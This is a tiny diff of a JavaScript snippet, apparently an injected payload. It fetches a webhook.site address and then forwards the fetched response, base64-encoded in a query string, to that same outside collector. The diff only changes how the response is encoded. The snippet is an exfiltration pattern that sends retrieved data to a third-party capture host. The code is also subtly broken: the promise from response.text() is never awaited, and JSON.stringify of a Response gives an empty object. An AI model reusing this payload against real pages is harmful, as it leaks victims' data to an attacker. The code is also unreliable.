@@ -4,7 +4,7 @@
     const url = 'https://webhook.site/61d14abf-1552-4231-ac33-481aca823fff'
     response = await fetch(url)
 
-    const url2 = 'https://webhook.site/61d14abf-1552-4231-ac33-481aca823fff?r='+btoa(JSON.stringify(response))
+    const url2 = 'https://webhook.site/61d14abf-1552-4231-ac33-481aca823fff?r='+btoa(response.text())
     response2 = await fetch(url2)
 
 })()
